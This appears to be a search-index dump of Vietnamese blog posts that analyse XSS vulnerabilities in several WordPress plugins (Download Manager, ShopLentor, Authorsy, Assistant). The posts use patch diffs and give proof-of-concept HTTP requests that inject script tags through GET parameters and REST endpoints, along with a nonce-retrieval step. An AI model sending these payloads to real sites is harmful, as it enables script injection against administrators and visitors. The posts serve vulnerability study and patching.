URL: edit.php?post_type=wpdmpro\u0026page=wpdm-stats Breakpoint debugging to observe GET params Tr∆∞·ªõc ti√™n, plugin l·∫•y to√†n b·ªô GET parameters v√†o $get_params. N·∫øu $user_ids kh√¥ng r·ªóng, plugin s·∫Ω t·∫°o n√∫t ‚ÄúClear filter‚Äù. ƒê·ªÉ l√†m n√∫t n√†y ho·∫°t ƒë·ªông, c·∫ßn m·ªôt URL m√† kh√¥ng c√≤n user_ids n·ªØa, n√™n plugin l√†m nh∆∞ sau: $get_params_xu = $get_params; // copy to√†n b·ªô GET parameters unset($get_params_xu['user_ids']); // b·ªè user_ids ra kh·ªèi m·∫£ng $reset_url = add_query_arg($get_params_xu, 'edit.php'); // t·∫°o URL m·ªõi unset($get_params_xu['user_ids']) =\u003e lo·∫°i b·ªè b·ªô l·ªçc user_ids kh·ªèi URL. add_query_arg($get_params_xu, 'edit.php') \u003e t·∫°o URL m·ªõi v·ªõi c√°c tham s·ªë c√≤n l·∫°i. Cu·ªëi c√πng, URL n√†y ƒë∆∞·ª£c g·∫Øn v√†o n√∫t ‚ÄúClear filter‚Äù: \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\"\u003e...\u003c/a\u003e K·∫øt qu·∫£: Khi ng∆∞·ªùi d√πng nh·∫•n n√∫t, trang s·∫Ω load l·∫°i m√† kh√¥ng c√≤n b·ªô l·ªçc user_ids, t·ª©c l√† ‚Äúclear filter‚Äù. ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS\rG·ª≠i GET request ch·ª©a XSS payload: GET /wp-admin/edit.php?post_type=wpdmpro\u0026page=wpdm-stats\u0026user_ids[0]=1\u0026payload=\"\u003e\u003c/a\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e HTTP/1.1 Ta th√™m \"\u003e\u003c/a\u003e ƒë·ªÉ ƒë√≥ng th·∫ª \u003ca\u003e sau ƒë√≥ th√™m 1 script d·ªÉ alert() Reflected XSS triggered via GET parameter üëâ XSS th√†nh c√¥ng, khi ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn truy c·∫≠p v√†o URL do attacker cung c·∫•p th√¨ reflected XSS x·∫£y ra =\u003e X·∫£y ra ƒë√∫ng k·ªãch b·∫£n Unauthenticated ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-10146 trong plugin WordPress Download Manager \u003c= 3.3.23 l√† reflected XSS, x·∫£y ra khi d·ªØ li·ªáu t·ª´ GET request ƒë∆∞·ª£c in tr·ª±c ti·∫øp v√†o HTML attribute m√† kh√¥ng ƒë∆∞·ª£c sanitize ho·∫∑c escape. Ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o ƒë∆∞·ªùng d·∫´n n√†y (admin/author) c√≥ th·ªÉ b·ªã t·∫•n c√¥ng n·∫øu truy c·∫≠p URL do attacker t·∫°o. B·∫£n v√° 3.3.24 ƒë√£: Sanitize m·∫£ng GET parameters (sanitize_array) ƒë·ªÉ lo·∫°i b·ªè k√Ω t·ª± nguy hi·ªÉm. Escape URL khi in ra HTML (esc_url) ƒë·ªÉ ngƒÉn XSS. Key takeaways: Lu√¥n sanitize v√† escape d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng tr∆∞·ªõc khi render ra HTML. Ki·ªÉm tra quy·ªÅn truy c·∫≠p tr∆∞·ªõc khi x·ª≠ l√Ω ho·∫∑c hi·ªÉn th·ªã d·ªØ li·ªáu nh·∫°y c·∫£m. Ngay c·∫£ c√°c role th·∫•p (contributor) v·∫´n c√≥ th·ªÉ tr·ªü th√†nh ƒëi·ªÉm t·∫•n c√¥ng n·∫øu plugin kh√¥ng b·∫£o v·ªá ƒë√∫ng c√°ch. C·∫≠p nh·∫≠t plugin th∆∞·ªùng xuy√™n l√† c√°ch ph√≤ng th·ªß ƒë∆°n gi·∫£n nh∆∞ng hi·ªáu qu·∫£ nh·∫•t. ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress Download Manager Plugin \u003c= 3.3.24 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress ShopLentor Plugin.","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng trong plugin ShopLentor tr∆∞·ªõc phi√™n b·∫£n 3.2.0 cho ph√©p k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn contributor ch√®n m√£ ƒë·ªôc v√†o CSS c·ªßa block. CSS n√†y sau ƒë√≥ ƒë∆∞·ª£c n·∫°p inline v√†o trang v√† c√≥ kh·∫£ nƒÉng d·∫´n t·ªõi Stored XSS khi ƒë∆∞·ª£c preview ho·∫∑c hi·ªÉn th·ªã trong tr√¨nh duy·ªát. CVE ID: CVE-2025-58990 Product: WordPress ShopLentor Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.2.0 CVSS severity: Low (6.5) Required Privilege: Contributor ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. ShopLentor: v3.2.0(vul) v√† v3.2.1(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i ShopLentor Plugin ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file woolentor-blocks/includes/classes/Manage_Styles.php. B·∫£n l·ªói: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Kh√¥ng ki·ªÉm tra quy·ªÅn user // Kh√¥ng l·ªçc n·ªôi dung CSS tr∆∞·ªõc khi l∆∞u update_post_meta( $post_id, '_woolentor_css', $params['block_css'] ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $params['block_css'] ); } B·∫£n v√°: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Ch·ªâ admin ho·∫∑c t√°c gi·∫£ b√†i vi·∫øt m·ªõi ƒë∆∞·ª£c ph√©p $post = get_post( $post_id ); if ( ! $post || ( ! current_user_can('manage_options') \u0026\u0026 get_current_user_id() !== (int) $post-\u003epost_author ) ) { return ['success' =\u003e false, 'message' =\u003e __('No permission')]; } // L·ªçc d·ªØ li·ªáu tr∆∞·ªõc khi l∆∞u $block_css = $this-\u003esanitize_css_content( $params['block_css'] ); update_post_meta( $post_id, '_woolentor_css', $block_css ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $block_css ); } B·∫£n v√° d√πng current_user_can(manage_options) ƒë·ªÉ ki·ªÉm tra c√≥ ph·∫£i admin kh√¥ng N·∫øu user l√† admin =\u003e v·∫ø ƒë·∫ßu ! current_user_can('manage_options') = false =\u003e c·∫£ bi·ªÉu th·ª©c \u0026\u0026 = false =\u003e qua ƒë∆∞·ª£c. N·∫øu user l√† author =\u003e v·∫ø sau get_current_user_id() !== (int) $post-\u003epost_author = false =\u003e c·∫£ bi·ªÉu th·ª©c \u0026\u0026 = false =\u003e qua ƒë∆∞·ª£c. Patch Diff ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Work?\rpublic function save_block_css( $request ){ try{ global $wp_filesystem; if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); if ( $post_id == 'woolentor-widget' \u0026\u0026 $params['has_block'] ) { update_option( $post_id, $params['block_css'] ); return [ 'success' =\u003e true, 'message' =\u003e __('Widget CSS Saved.', 'woolentor') ]; } $filename = \"woolentor-css-{$post_id}.css\"; $upload_dir_url = wp_upload_dir(); $dirname = trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/'; if ( $params['has_block'] ) { update_post_meta( $post_id, '_woolentor_active', 'yes' ); $all_block_css = $params['block_css']; WP_Filesystem( false, $upload_dir_url['basedir'], true ); if( ! $wp_filesystem-\u003eis_dir( $dirname ) ) { $wp_filesystem-\u003emkdir( $dirname ); } update_post_meta( $post_id, '_woolentor_css', $all_block_css ); if ( ! $wp_filesystem-\u003eput_contents( $dirname . $filename, $all_block_css ) ) { throw new \\Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); } return [ 'success' =\u003e true, 'message' =\u003e__('WooLentor Blocks css file update.', 'woolentor' ) ]; } else { delete_post_meta( $post_id, '_woolentor_active' ); if ( file_exists( $dirname.$filename ) ) { wp_delete_file( $dirname.$filename ); } delete_post_meta( $post_id, '_woolentor_css' ); return [ 'success' =\u003e true, 'message' =\u003e __('WooLentor Blocks CSS Delete.', 'woolentor' ) ]; } } catch( \\Exception $e ){ return [ 'success' =\u003e false, 'message' =\u003e $e-\u003egetMessage() ]; } } H√†m save_block_css() thu·ªôc class Manage_Styles c√≥ nhi·ªám v·ª• l∆∞u ho·∫∑c x√≥a CSS tu·ª≥ theo block. ·ª®ng d·ª•ng s·∫Ω l·∫•y post_id v√† n·ªôi dung block_css t·ª´ request. Tr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát: n·∫øu post_id = woolentor-widget =\u003e l∆∞u CSS v√†o wp_options Tr∆∞·ªùng h·ª£p b√†i vi·∫øt th∆∞·ªùng: N·∫øu c√≥ block (has_block = true): ƒê√°nh d·∫•u post ƒëang active (_woolentor_active). L∆∞u CSS v√†o b·∫£ng wp_postmeta v·ªõi meta_key l√† _woolentor_css. mysql\u003e select * from wp_postmeta where meta_key='_woolentor_css'; +---------+---------+----------------+------------+ | meta_id | post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 27 | 69 | _woolentor_css | body:{} | | 687 | 1416 | _woolentor_css | body:{} | +---------+---------+----------------+------------+ Ghi CSS ra file trong th∆∞ m·ª•c upload (woolentor-css-{post_id}.css). Write CSS N·∫øu kh√¥ng c√≥ block (has_block = false): Xo√° tr·∫°ng th√°i active v√† CSS meta. Xo√° file CSS n·∫øu t·ªìn t·∫°i. üëâ Kh·∫£ nƒÉng x·∫£y ra l√† combo Stored XSS ph·ªï bi·∫øn trong plugin WordPress: user role contributor (kh√¥ng c√≥ quy·ªÅn publish) t·∫°o post c√≥ CSS ch·ª©a payload XSS. Payload n√†y ƒë∆∞·ª£c l∆∞u trong database ho·∫∑c m·ªôt file; Ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn cao h∆°n s·∫Ω preview (xem tr∆∞·ªõc) n·ªôi dung tr∆∞·ªõc khi publish, payload s·∫Ω ƒë∆∞·ª£c t·∫£i/hi·ªÉn th·ªã trong tr√¨nh duy·ªát v√† th·ª±c thi, g√¢y ra XSS. ƒê·ªÉ hi·ªÉu c√°ch d·ªØ li·ªáu ƒë∆∞·ª£c hi·ªÉn th·ªã, ta t√¨m v·ªõi t·ª´ kh√≥a _woolentor_css trong th∆∞ m·ª•c plugin. V√¨ CSS ƒë∆∞·ª£c l∆∞u trong wp_postmeta v·ªõi meta_key = _woolentor_css, n√™n ch·∫Øc ch·∫Øn plugin s·∫Ω truy v·∫•n gi√° tr·ªã n√†y v√† ch√®n tr·ª±c ti·∫øp v√†o HTML. Search Meta Key generate_inline_css() l·∫•y block CSS t·ª´ wp_postmeta v·ªõi meta_key = _woolentor_css v√† l·∫•y t·ª´ file woolentor-css-{$post_id}.css, n·∫øu file t·ªìn t·∫°i th√¨ get_contents v√† inline CSS cho post c√≥ $post_id ƒë∆∞·ª£c truy·ªÅn v√†o, c√≤n n·∫øu file kh√¥ng t·ªìn t·∫°i th√¨ l·∫•y t·ª´ wp_postmeta. N·ªôi dung ƒë∆∞·ª£c ƒë·∫∑t trong th·∫ª \u003cstyle type=\"text/css\"\u003e\u003c/style\u003e class Manage_Styles ƒëƒÉng k√Ω REST API trong h√†m register_routes public function register_routes( $namespace ){ register_rest_route( $namespace, 'save_css', [ [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'save_block_css' ], 'permission_callback' =\u003e [ $this, 'permission_check' ], 'args' =\u003e [] ] ] ); // other route } H√†m register_rest_route() t·∫°o m·ªôt REST API endpoint t·∫°i ƒë∆∞·ªùng d·∫´n: /wp-json/{namespace}/save_css Khi c√≥ request POST t·ªõi endpoint n√†y: WordPress s·∫Ω g·ªçi h√†m save_block_css() ƒë·ªÉ x·ª≠ l√Ω d·ªØ li·ªáu. Tr∆∞·ªõc ƒë√≥, permission_cal","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS\rS·ª≠ d·ª•ng user c√≥ role contributor t·∫°o 1 post b·∫•t k√¨, ghi nh·ªõ id c·ªßa post ƒë√≥. G·ª≠i POST request ƒë·∫øn endpoint http://localhost/wp-json/woolentor/v1/save_css v·ªõi XSS payload POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Response üëâ Thi·∫øu header X-WP-Nonce ƒë·ªÉ ph√¢n quy·ªÅn ng∆∞·ªùi d√πng. Ta m·ªü source HTML (Ctrl+U) trang ch·ªânh s·ª≠a b√†i vi·∫øt: view-source:http://localhost/wp-admin/post.php?post=\u003cpost_id\u003e\u0026action=edit T√¨m wpApiSettings trong source v√† l·∫•y gi√° tr·ªã nonce wpApiSettings G·ª≠i request v·ªõi X-WP-Nonce c√≥ gi√° tr·ªã v·ª´a l·∫•y ƒë∆∞·ª£c POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost X-WP-Nonce: f79ec79e4b Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Preview post Preview üëâ XSS th√†nh c√¥ng, inspect ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o View source code Code ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-58990 trong plugin ShopLentor \u003c= 3.2.0 cho ph√©p contributor ch√®n CSS ƒë·ªôc h·∫°i d·∫´n ƒë·∫øn Stored XSS khi admin/author preview ho·∫∑c xem post. B·∫£n v√° 3.2.1 b·ªï sung ki·ªÉm tra quy·ªÅn v√† sanitize CSS, ngƒÉn ch·∫∑n khai th√°c. Key takeaways: Lu√¥n k·∫øt h·ª£p ki·ªÉm tra quy·ªÅn v√† sanitize d·ªØ li·ªáu khi x·ª≠ l√Ω input t·ª´ ng∆∞·ªùi d√πng. C√°c role th·∫•p (nh∆∞ contributor) v·∫´n c√≥ th·ªÉ tr·ªü th√†nh ƒëi·ªÉm t·∫•n c√¥ng n·∫øu API kh√¥ng b·∫£o v·ªá ƒë√∫ng c√°ch. Stored XSS trong WordPress th∆∞·ªùng xu·∫•t hi·ªán khi d·ªØ li·ªáu ƒë∆∞·ª£c l∆∞u DB/file =\u003e render inline m√† kh√¥ng l·ªçc. Vi·ªác c·∫≠p nh·∫≠t plugin k·ªãp th·ªùi l√† bi·ªán ph√°p ph√≤ng th·ªß ƒë∆°n gi·∫£n nh∆∞ng hi·ªáu qu·∫£ nh·∫•t. ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress ShopLentor Plugin \u003c= 3.2.0 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Authorsy Plugin.","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Authorsy c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.0.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang. CVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Trong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn Subscriber nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c Unauthenticated. ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Authorsy: v1.0.5(vul) v√† v1.0.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r·ª®ng d·ª•ng c√≥ ch·ª©c nƒÉng t√πy ch·ªânh CSS, l∆∞u d·ªØ li·ªáu trong wp_options v√† ch√®n tr·ª±c ti·∫øp v√†o \u003cstyle\u003e tr√™n trang. Tuy nhi√™n, ng∆∞·ªùi d√πng c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi API ƒë·ªÉ ch·ªânh s·ª≠a d·ªØ li·ªáu CSS m√† kh√¥ng b·ªã ki·ªÉm so√°t quy·ªÅn, d·∫´n ƒë·∫øn nguy c∆° Broken Access Control v√† c√≥ th·ªÉ XSS n·∫øu ch√®n payload ƒë·ªôc h·∫°i. ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file core/settings/api-settings.php v√† core/enqueue-inline/enqueue-inline.php Diff showing changes in enqueue-inline.php to sanitize custom CSS Diff showing REST API permission callback changes in api-settings.php ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS\rG·ª≠i POST request ƒë·∫øn /wp-json/authorsy/v1/settings v·ªõi XSS payload: POST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \"primary_color\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Ta ƒë√≥ng th·∫ª \u003cstyle\u003e (CSS trong head) v√† inject th√™m th·∫ª \u003cscript\u003e ch·ª©a XSS payload. Truy c·∫≠p m·ªôt trang b·∫•t k·ª≥. XSS payload injected via custom CSS üëâ XSS th√†nh c√¥ng, inspect ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o. \u003cstyle\u003e :root { --ea-color-main: \u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e; } \u003c/style\u003e ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-27006 trong plugin Authorsy \u003c= 1.0.5 l√† m·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh v·ªÅ Broken Access Control k·∫øt h·ª£p v·ªõi XSS. Nguy√™n nh√¢n ch√≠nh l√†: REST API kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p: b·∫•t k·ª≥ user n√†o c≈©ng c√≥ th·ªÉ g·ªçi /wp-json/authorsy/v1/settings ƒë·ªÉ thay ƒë·ªïi c√°c option. CSS t√πy ch·ªânh ch∆∞a ƒë∆∞·ª£c sanitize: gi√° tr·ªã CSS ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o \u003cstyle\u003e trong \u003chead\u003e, cho ph√©p k·∫ª t·∫•n c√¥ng inject payload \u003cscript\u003e th√¥ng qua CSS. Nonce kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng: verify_nonce ch·ªâ tr·∫£ v·ªÅ WP_Error m√† kh√¥ng ngƒÉn code th·ª±c thi, khi·∫øn vi·ªác ki·ªÉm tra b·∫£o m·∫≠t g·∫ßn nh∆∞ v√¥ hi·ªáu. Key takeaways: REST API c·∫ßn ki·ªÉm so√°t quy·ªÅn: lu√¥n s·ª≠ d·ª•ng permission_callback h·ª£p l√Ω ƒë·ªÉ ngƒÉn Broken Access Control. Sanitize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi render trong HTML/CSS/JS ƒë·ªÉ ph√≤ng XSS. ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress Authorsy Plugin \u003c= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Assistant Plugin.","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Assistant c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang. CVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Assistant: v1.5.2(vul) v√† v1.5.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version ","date":"2025-10-03","objectID":"/vi/posts/2025-10-03-cve-2025-53307/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/vi/posts/2025-10-03-cve-2025-53307/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r·ª®ng d·ª•ng hi·ªÉn th·ªã tr·ª±c ti·∫øp n·ªôi dung h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p th√¥ng qua URL m√† kh√¥ng x√°c th·ª±c v√† ki·ªÉm tra ƒë·∫ßy ƒë·ªß MIME type. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt t·∫≠p tin gi·∫£ d·∫°ng h√¨nh ·∫£nh v√† khi ƒë∆∞·ª£c tr√¨nh duy·ªát x·ª≠ l√Ω, 